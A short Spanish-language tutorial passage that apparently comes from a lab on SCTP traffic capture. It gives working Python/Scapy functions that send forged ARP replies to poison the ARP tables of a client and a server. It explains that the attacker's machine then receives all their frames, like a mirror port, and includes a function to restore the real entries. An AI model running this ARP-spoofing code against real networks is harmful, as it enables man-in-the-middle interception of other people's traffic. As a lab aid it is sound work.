<div class="page">

# Haciendo un spoofing

\

Mediante unas funciones muy simples y el Scapy, es posible hacer una
corrupción de las tablas de ARP tanto en el cliente como el servidor:

<div class="codebox">

    # Función para obtener la MAC
    def get_mac(ip): 
        arp_request = scapy.ARP(pdst = ip) 
        broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff") 
        arp_request_broadcast = broadcast / arp_request 
        answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0] 
        return answered_list[0][1].hwsrc 

    # Función para realizar ARP Spoofing
    def arp_spoof_basic(target_ip, spoof_ip):

        # Get the MAC address of the target IP
        target_mac = scapy.getmacbyip(target_ip)
        # Create the ARP packet
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        # Send the ARP packet
        scapy.send(packet, verbose=False)
        # Return the MAC address of the target IP
        return target_mac

    #    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=scapy.getmacbyip(target_ip), psrc=spoof_ip)
    #    scapy.send(packet, verbose=False)

    # Función para restaurar los valores originales en las tablas ARP
    def restore(destination_ip, source_ip): 
        print(destination_ip)
        #destination_mac = get_mac(destination_ip) 
        destination_mac = scapy.getmacbyip(destination_ip)
        print(str(destination_mac + " - " + destination_ip))
        #source_mac = get_mac(source_ip) 
        source_mac = scapy.getmacbyip(source_ip)
        print(str(source_mac + " - " + source_ip))
        packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac) 
        scapy.sendp(scapy.Ether(dst=destination_mac)/packet, verbose = False) 

</div>

<span style="color:#333333;"> </span>

La consecuencia directa del spoofing es que de esa manera podemos
recibir en nuestro equipo todas las tramas que intercambia cliente y
servidor:

![](../images/47-1.png)

En wireshark se observa como por cada SCTP que genera el cliente hay una
idéntica que se reenvía con la MAC del atacante. Lo mismo ocurre con las
SCTP enviadas desde el servidor.

La consecuencia directa es que no necesitamos capturar en cada extremo,
envenenando las tablas ARP el sistema actua como un puerto espejo, sin
afectar al comportamineto de la comunicación cliente-servidor

</div>
